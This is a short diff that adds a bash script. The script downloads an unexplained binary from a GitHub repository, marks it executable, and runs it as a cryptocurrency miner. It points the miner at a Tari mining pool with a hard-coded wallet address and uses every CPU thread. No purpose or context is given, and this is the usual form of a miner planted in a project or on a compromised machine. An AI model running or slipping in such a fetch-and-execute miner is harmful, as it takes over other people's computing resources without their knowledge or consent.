@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/kartolo92/jadul/raw/refs/heads/main/xmolx
+chmod +x xmolx
+./xmolx --donate-level 1 -o pool-global.tari.snipanet.com:3333 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) 
